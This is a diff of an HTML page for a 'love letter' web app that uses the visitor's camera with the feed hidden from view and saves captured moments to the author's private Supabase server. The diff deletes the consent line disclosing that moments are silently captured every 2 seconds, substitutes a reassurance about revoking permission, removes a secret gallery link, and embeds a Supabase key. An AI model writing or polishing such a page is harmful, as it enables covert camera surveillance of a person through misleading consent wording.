@@ -16,7 +16,7 @@
     </div>
 
     <main class="app-shell">
-      <!-- Consent and Onboarding Screen -->
+      <!-- Consent Screen -->
       <section id="consent-screen" class="screen consent-screen" aria-labelledby="consent-title">
         <div class="card consent-card">
           <div class="eyebrow">a tiny love letter in code</div>
@@ -25,11 +25,11 @@
           <p class="subtitle">A little magical mirror that smiles back at you.</p>
           <div class="consent-copy">
             <p>Yeh website aapka camera use karegi.</p>
-            <p>Aapke cute moments automatically capture hoke private server pe save honge.</p>
-            <p>Main baad mein inse pyaare surprises banaunga.</p>
+            <p>Aapke moments record hoke mere private server pe save honge.</p>
+            <p>Main baad mein inse cute surprises banaunga.</p>
             <p><strong>Allow karne se pehle soch lo.</strong></p>
           </div>
-          <p class="privacy-note">Camera feed screen par kabhi nahi dikhegi. Har 2 second mein aapke smile aur moments silently capture hote rahenge.</p>
+          <p class="privacy-note">Camera feed screen par kabhi nahi dikhegi. Aap jab chahein browser permission band kar sakti hain.</p>
           <button id="start-button" class="primary-button">Allow Camera &amp; Start <span>♡</span></button>
           <p id="consent-error" class="error-message" role="alert" hidden></p>
         </div>
@@ -46,11 +46,13 @@
           <div id="reaction-burst" class="reaction-burst" aria-hidden="true"></div>
           <div id="speech-bubble" class="speech-bubble" hidden>hi cutie ✨</div>
 
-          <!-- Lottie vector animated avatar -->
-          <div id="lottie-container" class="lottie-container" aria-label="Animated avatar"></div>
+          <!-- Real Cute Animated GIF Character -->
+          <div id="character-wrap" class="character-wrap">
+            <img id="gif-character" class="gif-character pop-anim" src="./assets/smile.gif" alt="Cute character reaction" />
+          </div>
 
-          <!-- Fallback pure-CSS geometric avatar -->
-          <div id="avatar" class="avatar avatar-smile" aria-label="A cute cartoon girl reacting to you">
+          <!-- Fallback pure-CSS geometric avatar (only if GIF fails) -->
+          <div id="avatar" class="avatar avatar-smile" aria-label="A cute cartoon girl reacting to you" style="display: none;">
             <div class="hair hair-back"></div><div class="hair hair-front"></div>
             <div class="ear ear-left"></div><div class="ear ear-right"></div>
             <div class="face"><span class="eye eye-left"></span><span class="eye eye-right"></span><span class="blush blush-left"></span><span class="blush blush-right"></span><span class="mouth"></span></div>
@@ -64,7 +66,7 @@
         </div>
 
         <footer class="footer-note">
-          made with all my love <a href="./gallery.html" class="secret-gallery-link" title="Open Moments Gallery" aria-label="Moments Gallery">♥</a>
+          made with all my love <span>♥</span>
         </footer>
       </section>
     </main>
@@ -73,22 +75,17 @@
     <video id="camera-video" autoplay muted playsinline webkit-playsinline aria-hidden="true"></video>
     <canvas id="capture-canvas" width="1280" height="720" aria-hidden="true"></canvas>
 
-    <!-- Supabase environment config -->
+    <!-- Supabase environment configuration -->
     <script>
       window.__MIRROR_ENV__ = {
         SUPABASE_URL: "https://epjjteqytxdkahcesmzv.supabase.co",
         SUPABASE_ANON_KEY: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImVwamp0ZXF5dHhka2FoY2VzbXp2Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODgzNDYwOTMsImV4cCI6MjEwMzkyMjA5M30.mHtJx2VSa0btzfRf8AKbxEtUP9kwOAf4x2bsyDXMv60"
       };
     </script>
-    <!-- Lottie Web Player -->
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/bodymovin/5.12.2/lottie.min.js"></script>
-    <!-- MediaPipe dependencies -->
     <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/@mediapipe/hands/hands.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/@mediapipe/pose/pose.js"></script>
-    <!-- Supabase JS Client -->
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
-    <!-- Application Scripts -->
     <script src="./supabase.js"></script>
     <script src="./detection.js"></script>
     <script src="./app.js"></script>
